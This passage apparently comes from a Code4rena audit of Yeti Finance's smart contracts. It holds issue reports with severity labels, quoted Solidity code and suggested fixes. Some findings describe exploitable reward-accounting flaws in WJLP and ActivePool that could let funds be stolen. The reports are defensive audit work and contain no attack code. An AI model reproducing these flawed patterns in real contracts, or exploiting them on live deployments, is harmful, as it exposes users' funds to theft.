"html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/240", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function setAddresses in contract Whitelist is intended to be invoked only once (confirmed with the sponsor) but currently, it has no prevention from being called multiple times.  Maybe this should also be prevented in sYETIToken's setAddresses and ThreePieceWiseLinearPriceCurve's setAddresses.  ## Recommended Mitigation Steps Prevent repeated access of setAddresses in Whitelist and potentially in sYETIToken and ThreePieceWiseLinearPriceCurve.  "}, {"title": "TODOs", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/238", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-yetifinance-findings", "body": "TODOs"}, {"title": "`WJLP.getPendingRewards()` should be aview function", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact View functions consume less gas. `WJLP.getPendingRewards()` is technically also a view function but not specified as one. Because the `IMasterChefJoeV2` interface used by the contract is wrong. It says `poolInfo()` is not a view function, which it is.  ## Proof of Concept getPendingRewards: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L190  Faulty interface function: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L29  actually poolinfo is just an array so its getter is a view function: https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/MasterChefJoeV2.sol#L85  ## Tools Used none  ## Recommended Mitigation Step Declare both functions as `view` to save gas  "}, {"title": "CollSurplusPool doesn't verify that the passed `_whitelistAddress` is an actual contract addres", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/230", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact All the other passed variables are checked. Only `_whitelistAddress` is ignored. This allows passing a zero function which would break the functionality.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L51-L54  ## Tools Used none  ## Recommended Mitigation Steps add `checkContract(_whitelistAddress)`  "}, {"title": "Ownable doesn't allow transferring ownership", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/228", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-yetifinance-findings", "body": "Ownable doesn't allow transferring ownership"}, {"title": "GAS: packing structs saves gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/224", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "GAS: packing structs saves gas"}, {"title": "Lack of precision", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/221", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Lack of precision"}, {"title": "No sanity check of safe ratio when adding collateral", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/217", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  When changing collateral's ratio, it is rightly checked to be smaller than 110%. However when adding new collateral, the ratio check is not there, so it can be added with ratio that is larger than 110%.  ## Impact Accidentally adding an asset with larger ratio would result in users being able to withdraw more YUSD than supplied VC.  ## Proof of Concept When an asset is being added, there is no sanity check that the ratio is within the correct range. [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/Whitelist.sol#L92:#L127)  This is unlike `changeRatio`, which validates that the new ratio is in correct range. [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/Whitelist.sol#L204) ``` require(_ratio < 1100000000000000000, \"ratio must be less than 1.10 => greater than 1.1 would mean taking out more YUSD than collateral VC\"); ```  ## Recommended Mitigation Steps Add the same ratio check to `addCollateral`.  "}, {"title": "Gas: Unnecessary deadline increase", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/211", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Gas: Unnecessary deadline increase"}, {"title": "ActivePool unwraps but does not update user state in WJLP", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/209", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  Calling `WJLP.unwrap` burns WJLP, withdraws the amount from the master chef and returns the same amount of JLP back to the `to` address. However, it does not update the internal accounting in `WJLP` with a `_userUpdate` call.  This needs to be done on the caller side according to the comment in the `WJLP.unwrap` function: > \"Prior to this being called, the user whose assets we are burning should have their rewards updated\"  This happens when being called from the `StabilityPool` but not when being called from the `ActivePool.sendCollateralsUnwrap`:  ```solidity function sendCollateralsUnwrap(address _to, address[] memory _tokens, uint[] memory _amounts, bool _collectRewards) external override returns (bool) {     _requireCallerIsBOorTroveMorTMLorSP();     require(_tokens.length == _amounts.length);     for (uint i = 0; i < _tokens.length; i++) {         if (whitelist.isWrapped(_tokens[i])) {             // @audit this burns the tokens for _to but does not reduce their amount. so there are no tokens in WJLP masterchef but can keep claiming             IWAsset(_tokens[i]).unwrapFor(_to, _amounts[i]);             if (_collectRewards) {                 IWAsset(_tokens[i]).claimRewardFor(_to);             }         } else {             _sendCollateral(_to, _tokens[i], _amounts[i]); // reverts if send fails         }     }     return true; } ```  ## Impact The `unwrapFor` call withdraws the tokens from the Masterchef and pays out the user, but their user balance is never decreased by the withdrawn amount. They can still use their previous balance to claim rewards through `WJLP.claimReward` which updated their unclaimed joe reward according to the old balance. Funds from the WJLP pool can be stolen.  ## Recommended Mitigation Steps As the comment says, make sure the user is updated before each `unwrap` call. It might be easier and safer to have a second authorized `unwrapFor` function that accepts a `rewardOwner` parameter, the user that needs to be updated.   "}, {"title": "Wrapped JLP can be stolen", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/208", "labels": ["bug", "duplicate", "3 (High Risk)"], "target": "2021-12-yetifinance-findings", "body": "Wrapped JLP can be stolen"}, {"title": "Wrong `lastBuyBackPrice`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/206", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `sYETIToken.lastBuyBackPrice` is set in `buyBack` and hardcoded as:  ```solidity function buyBack(address routerAddress, uint256 YUSDToSell, uint256 YETIOutMin, address[] memory path) external onlyOwner {     require(YUSDToSell > 0, \"Zero amount\");     require(lastBuybackTime + 69 hours < block.timestamp, \"Must have 69 hours pass before another buyBack\");     yusdToken.approve(routerAddress, YUSDToSell);     uint256[] memory amounts = IRouter(routerAddress).swapExactTokensForTokens(YUSDToSell, YETIOutMin, path, address(this), block.timestamp + 5 minutes);     lastBuybackTime = block.timestamp;     // amounts[0] is the amount of YUSD that was sold, and amounts[1] is the amount of YETI that was gained in return. So the price is amounts[0] / amounts[1]     // @audit this hardcoded lastBuybackPrice is wrong when using a different path (think path length 3)     lastBuybackPrice = div(amounts[0].mul(1e18), amounts[1]);     emit BuyBackExecuted(YUSDToSell, amounts[0], amounts[1]); } ```  It divides the first and second return `amounts` of the swap, however, these amounts depend on the swap `path` parameter that is used by the caller. If a swap path of length 3 is used, then this is obviously wrong. It also assumes that each router sorts the pairs the same way (which is true for Uniswap/Sushiswap).  ## Impact The `lastBuyBackPrice` will be wrong when using a different path. This will lead `rebase`s using a different yeti amount and the `effectiveYetiTokenBalance` being updated wrong.  ## Recommended Mitigation Steps Verify the first and last element of the path are YETI/YUSD and use the first and last amount parameter.   "}, {"title": "sYETIToken does not emit Approval event in `transferFrom`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/205", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `sYETIToken.transferFrom` function does not emit a new `Approval` event when decreasing the allowance. Most ERC20 implementations, like OpenZeppelin's, emit this event when the `allowance` is decreased.  ## Impact Off-chain scripts and frontends will not correctly track the `allowance`s of users when listening to the `Approval` event. This can lead to failed transactions as a higher approval is assumed than it actually is.  ## Recommended Mitigation Steps Emit the `Approval` event also in `transferFrom` if the approval is decreased.   "}, {"title": "Fee not decayed if past `decayTime`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/204", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `ThreePieceWiseLinearPriceCurve.calculateDecayedFee` function is supposed to decay the `lastFeePercent` over time. This is correctly done in the `decay > 0 && decay < decayTime` case, but for the `decay > decayTime` case it does not decay at all but should set it to 0 instead..  ```solidity if (decay > 0 && decay < decayTime) {     // @audit if decay is close to decayTime, this fee will be zero. but below it'll be 1. the more time passes, the higher the decay. but then decay > decayTime should return 0.     fee = lastFeePercent.sub(lastFeePercent.mul(decay).div(decayTime)); } else {     fee = lastFeePercent; } ```  ## Recommended Mitigation Steps It seems wrong to handle the `decay == 0` case (decay happened in same block) the same way as the `decay >= decayTime` case (decay happened long time ago) as is done in the `else` branch. I believe it should be like this instead:  ```solidity // decay == 0 case should be full lastFeePercent if(decay < decayTime) {     fee = lastFeePercent.sub(lastFeePercent.mul(decay).div(decayTime)); } else {     // reset to zero if decay >= decayTime     fee = 0; } ```  "}, {"title": "rong comment in `getFee`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/203", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `ThreePieceWiseLinearPriceCurve.getFee` comment states that the total + the input must be less than the cap:  > If dollarCap == 0, then it is not capped. Otherwise, **then the total + the total input** must be less than the cap.  The code only checks if the input is less than the cap:  ```solidity // @param _collateralVCInput is how much collateral is being input by the user into the system if (dollarCap != 0) {     require(_collateralVCInput <= dollarCap, \"Collateral input exceeds cap\"); } ```  ## Recommended Mitigation Steps Clarify the desired behavior and reconcile the code with the comments.   "}, {"title": "`lastFeePercent` can be > 100%", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/202", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "`lastFeePercent` can be > 100%"}, {"title": "`lastFeeTime` can be reset", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/201", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "`lastFeeTime` can be reset"}, {"title": "Cannot use most piecewise linear functions with current implementation", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/200", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `ThreePieceWiseLinearPriceCurve.adjustParams` function uses three functions `f1, f2, f3` where `y_i = f_i(x_i)`. It computes the y-axis intersect (`b2 = f_2(0), b3 = f_3(0)`) for each of these but uses **unsigned integers** for this, which means these values cannot become negative. This rules out a whole class of functions, usually the ones that are desirable.  #### Example: Check out this two-piece linear interest curve of Aave:  ![Aave](https://docs.aave.com/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M51Fy3ipxJS-0euJX3h-2670852272%2Fuploads%2Fycd9OMRnInNeetUa7Lj1%2FScreenshot%202021-11-23%20at%2018.52.26.png?alt=media&token=7a25b900-7023-4ee5-b582-367d56d31894) The intersection of the second steep straight line with the y-axis `b_2 = f_2(0)` would be negative.  Example: Imagine a curve that is flat at `10%` on the first 50% utilization but shoots up to `110%` at 100% utilization.  - `m1 = 0, b1 = 10%, cutoff1 = 50%`  - `m2 = 200%` => `b2 = m1 * cutoff1 + b1 - m2 * cutoff1 = f1(cutoff1) - m2 * cutoff1 = 10% - 200% * 50% = 10% - 100% = -90%`. (`f2(100%) = 200% * 100% - 90% = 110%` \u2705) This function would revert in the `b2` computation as it underflows due to being a negative value.  ## Impact Most curves that are actually desired for a lending platform (becoming steeper at higher utilization) cannot be used.  ## Recommended Mitigation Steps Evaluate the piecewise linear function in a different way that does not require computing the y-axis intersection value. For example, for `cutoff2 >= x > cutoff1`, use `f(x) = f_1(cutoff) + f_2(x - cutoff)`. See [Compound](https://github.com/compound-finance/compound-protocol/blob/master/contracts/JumpRateModel.sol#L85).   "}, {"title": "Missing cutoff checks in `adjustParams`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/199", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  cmichel   # Vulnerability details  The `ThreePieceWiseLinearPriceCurve.adjustParams` function does not check that `_cutoff1 <= _cutoff2` and also does not revert in this case. However, this always indicates an error in how this function should be used.  ## Recommended Mitigation Steps Add a `_cutoff1 <= _cutoff2` check.  "}, {"title": "Collateral parameters can be overwritten", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/198", "labels": ["bug", "2 (Med Risk)"], "target": "2021-12-yetifinance-findings", "body": "Collateral parameters can be overwritten"}, {"title": "Missing duplicate checks in `withdrawColl`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/197", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-yetifinance-findings", "body": "Missing duplicate checks in `withdrawColl`"}, {"title": "contracts/Dependencies/CheckContract.sol has a potential gas optimization", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/189", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  heiho1   # Vulnerability details  ## Impact  CheckContract is used in ActivePool, BorrowerOperations, CollSurplusPool, DefaultPool, HintHelpers, PriceFeed, SortedTroves, StabilityPool, TroveManager, TroveManagerLiquidations, TroveManagerRedemptions but this is a view function and could easily be implemented as an internal library call.  This would result in slightly larger contract bytecode but should be far more gas efficient than an external contract call as is the current case.  ## Proof of Concept  https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678  \"\"\" Use any of the internal calling methods. We prefer internal library calls, because of the associated class features (see Class Features of Solidity by the same author). Using an external call to a public library function is very expensive, and will only be worth it to avoid including a lot of code into the bytecode for your contract. Using a local contract component is the most expensive option and should be avoided unless essential. \"\"\"  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/Dependencies/CheckContract.sol#L6  ## Tools Used  Slither  ## Recommended Mitigation Steps  Declare CheckContract as an internal library:  https://medium.com/coinmonks/all-you-should-know-about-libraries-in-solidity-dd8bc953eae7  \"\"\" Embedded Library: If a smart contract is consuming a library which have only internal functions than EVM simply embeds library into the contract. Instead of using delegate call to call a function, it simply uses JUMP statement(normal method call). There is no need to separately deploy library in this scenario. \"\"\"  "}, {"title": "contracts/TroveManagerRedemptions.sol is missing inheritance", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/188", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  heiho1   # Vulnerability details  ## Impact  TroveManagerRedemptions does not inherit contracts/Interfaces/ITroveManagerRedemptions.sol but should.  Note that TroveManager.sol does inherit ITroveManager.  Decoupling an interface from its implementation can lead to code drift and incomplete or incorrect interfaces/implementations.  ## Proof of Concept  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/TroveManagerRedemptions.sol#L38  ## Tools Used  Slither  ## Recommended Mitigation Steps  Declare contract as \"TroveManagerRedemptions is TroveManagerBase, ITroveManagerRedemptions\"  "}, {"title": "contracts/TroveManagerLiquidations.sol is missing inheritance", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/187", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  heiho1   # Vulnerability details  ## Impact  TroveManagerLiquidations does not inherit contracts/Interfaces/ITroveManagerLiquidations.sol but should.  Note that TroveManager.sol  does inherit ITroveManager.  Decoupling an interface from its implementation can lead to code drift and incomplete or incorrect interfaces/implementations.  ## Proof of Concept  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/TroveManagerLiquidations.sol#L14  ## Tools Used  Slither  ## Recommended Mitigation Steps  Declare contract as \"TroveManagerLiquidations is TroveManagerBase, ITroveManagerLiquidations\"  "}, {"title": "Reentrancy in contracts/BorrowerOperations.sol", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/183", "labels": ["bug", "2 (Med Risk)"], "target": "2021-12-yetifinance-findings", "body": "Reentrancy in contracts/BorrowerOperations.sol"}, {"title": "NamespaceCollision: Multiple SafeMath contracts", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/181", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  heiho1   # Vulnerability details  ## Impact  Got an error attempting Slither analysis due to several contracts defining \"SafeMath\"   - In this case there are *two* distinct safe math libraries, one dependent on solc 0.6.11 and one dependent on solc ^0.8.0. This can lead to confusion during development.  Ideally the safe math version of the application contract [0.6.11] would be standardized but in this case *re-naming* the SafeMath contracts also suffices.  ## Proof of Concept  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/SafeMath.sol#L15  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/Dependencies/SafeMath.sol#L21    ## Tools Used  Slither  ## Recommended Mitigation Steps  Rename packages/contracts/contracts/AssetWrappers/WJLP/SafeMath.sol to SafeMath080.sol [and updating the declared contract to the same name]  "}, {"title": "Multiple contracts or interfaces with the same name", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/180", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  heiho1   # Vulnerability details  ## Impact Got an error attempting Slither analysis due to Pool2Unipool and Unipool declaring the same contract named LPTokenWrapper.  It is confusing and error prone to have such similarly named contracts and there is no clear benefit to re-using the name.  ## Proof of Concept  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/LPRewards/Pool2Unipool.sol#L23  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/LPRewards/Pool2Unipool.sol#L23  ## Tools Used  Slither  ## Recommended Mitigation Steps  Rename LPTokenWrapper in Pool2Unipool to 'Pool2LPTokenWrapper' and correct any related imports.  "}, {"title": "\"constants\" expressions are expressions, not constants, so constant\u00a0`keccak`\u00a0variables results in extra hashing (and so gas).", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/175", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact In a number of places a `keccak(\"string\")` expression is assigned to a `constant` variable. Due to how `constant` variables are implemented this results in the hash being recomputed each time that the variable is used, spending the gas necessary to perform this action.  If these variables were to be `immutable` this hash is calculated once at deploy time and then the result is saved to be used directly at runtime rather than recalculating, saving the cost of hashing.  See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232)  ## Proof of Concept ``` YETI\\YETIToken.sol:   50:     bytes32 private constant _PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");   51:     bytes32 private constant _TYPE_HASH = keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\");  YETI\\BoringCrypto\\Domain.sol:   10:     bytes32 private constant DOMAIN_SEPARATOR_SIGNATURE_HASH = keccak256(\"EIP712Domain(uint256 chainId,address verifyingContract)\"); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change all `constant` hashes to be `immutable`  "}, {"title": "!= 0 costs less gass compared to > 0 for unsigned integer inside pure or view functions", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/173", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "!= 0 costs less gass compared to > 0 for unsigned integer inside pure or view functions"}, {"title": "Check if transfer amount > 0", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking non-zero transfer values can avoid an external call to save gas.   ## Proof of Concept Instances missing a non-zero check: ``` ActivePool.sol:   156:         bool sent = IERC20(_collateral).transfer(_to, _amount);  BorrowerOperations.sol:   742:             bool transferredToActivePool = coll.transferFrom(_from, address(activePool), amount);  DefaultPool.sol:   121:         bool success = IERC20(_collateral).transfer(activePool, _amount);  StabilityPool.sol:   947:                 IERC20(assets[i]).transfer(_to, amounts[i]);  TeamAllocation.sol:   69:             require(YETI.transfer(member, amount));   77:         YETI.transfer(_to, _amount);  YetiFinanceTreasury.sol:   25:         _token.transfer(_to, _amount);  AssetWrappers\\WJLP\\WJLP.sol:   127:         JLP.transferFrom(_from, address(this), _amount);   166:         JLP.transfer(_to, _amount);   273:             JOE.transfer(_to, _amount);  Dependencies\\LiquityBase.sol:   170:             if (!token.transfer(_to, _coll.amounts[i])) {  LPRewards\\Dependencies\\SafeERC20.sol:   23:         _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));   27:         _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));  YETI\\CommunityIssuance.sol:   125:         yetiToken.transfer(_account, _YETIamount);  YETI\\LockupContract.sol:   68:         yetiTokenCached.transfer(beneficiary, YETIBalance);  YETI\\ShortLockupContract.sol:   67:         yetiTokenCached.transfer(beneficiary, YETIBalance);  YETI\\sYETIToken.sol:   203:         yetiToken.transfer(to, amount);  YETI\\TeamLockup.sol:   47:             require(YETI.transfer(multisig, _amount)); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Check if transfer amount > 0. It is done at some places already, like here: https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/LPRewards/Unipool.sol#L189-L192  "}, {"title": "Explicit initialization with zero not required", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/170", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Explicit initialization with zero is not required for variable declaration because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.  ## Proof of Concept Instances include: ``` ./NFTXEligibilityManager.sol:85:        for (uint256 i = 0; i < modulesCopy.length; i++) { ./NFTXLPStaking.sol:81:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXLPStaking.sol:206:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXMarketplaceZap.sol:263:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:297:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:379:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:399:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:414:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:437:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXSimpleFeeDistributor.sol:62:    for (uint256 i = 0; i < length; i++) {  { ./NFTXVaultUpgradeable.sol:364:        for (uint256 i = 0; i < len; i++) { ./NFTXVaultUpgradeable.sol:406:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:419:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:442:        for (uint256 i = 0; i < amount; i++) { ```  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps Remove explicit initialization with zero.  "}, {"title": "Bytes constants are more efficient than string constants", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/169", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Bytes constants are more efficient than string constants"}, {"title": "Use of uint8 for counter in for loop increases gas costs", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/168", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Use of uint8 for counter in for loop increases gas costs"}, {"title": "Incompatibility With Rebasing/Deflationary/Inflationary tokens", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/167", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Incompatibility With Rebasing/Deflationary/Inflationary tokens"}, {"title": "Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Use `calldata` instead of `memory` for function parameters"}, {"title": "Declare state variables as immutable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  In `WJLP.sol`, state variables `JLP` and `JOE` are initialized in the constructor and never reassigned again. Thus, they can be declared `immutable` rather than `constant` in order to save gas  ## Proof of Concept  [https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L41](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L41)  ## Tools Used  Editor  "}, {"title": "Mixed compiler versions", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/158", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-yetifinance-findings", "body": "Mixed compiler versions"}, {"title": "Usage of assert() instead of require()", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/157", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Usage of assert() instead of require()"}, {"title": "Wrong assumption that wrapped asset holder is receiver of wrapped asset rewards", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/153", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Wrong assumption that wrapped asset holder is receiver of wrapped asset rewards"}, {"title": "StabilityPool does not update rewards when upwrapping wrapped asset", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/152", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "StabilityPool does not update rewards when upwrapping wrapped asset"}, {"title": "Out of gas.", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/151", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Out of gas."}, {"title": "ActivePool does not update rewards before unwrapping wrapped asset", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/150", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  When ActivePool sends collateral which is a wrapped asset, it first unwraps the asset, and only after that updates the rewards. This should be done in opposite order. As a comment in WJLP's `unwrapFor` rightfully mentions - \"Prior to this being called, the user whose assets we are burning should have their rewards updated\".  ## Impact Lost yield for user.  ## Proof of Concept In ActivePool's `sendCollateralsUnwrap` (which is used throughout the protocol), it firsts unwraps the asset, and only afterwards calls `claimRewardFor` which will update the rewards: [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/ActivePool.sol#L186:#L188) ``` IWAsset(_tokens[i]).unwrapFor(_to, _amounts[i]); if (_collectRewards) {         IWAsset(_tokens[i]).claimRewardFor(_to); } ``` `claimRewardFor` will end up calling `_userUpdate`: [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L246:#L263) ```     function _userUpdate(address _user, uint256 _amount, bool _isDeposit) private returns (uint pendingJoeSent) {         uint256 accJoePerShare = _MasterChefJoe.poolInfo(_poolPid).accJoePerShare;         UserInfo storage user = userInfo[_user];         if (user.amount > 0) {             user.unclaimedJOEReward = user.amount.mul(accJoePerShare).div(1e12).sub(user.rewardDebt);         }         if (_isDeposit) {             user.amount = user.amount.add(_amount);         } else {             user.amount = user.amount.sub(_amount);         }         user.rewardDebt = user.amount.mul(accJoePerShare).div(1e12);     } ``` Now, as ActivePool has already called `unwrapFor` and has burnt the user's tokens, and let's assume they all were used as collateral, it means user.amount=0*, and the user's unclaimedJOEReward won't get updated to reflect the rewards from the last user update. This is why, indeed as the comment in `unwrapFor` says, user's reward should be updated prior to that.  *Note: at the moment `unwrapFor` doesn't updates the user's user.amount, but as I detailed in another issue, that's a bug, as that means the user will continue accruing rewards even after his JLP were removed from the protocol.  ## Recommended Mitigation Steps Change the order of operations in 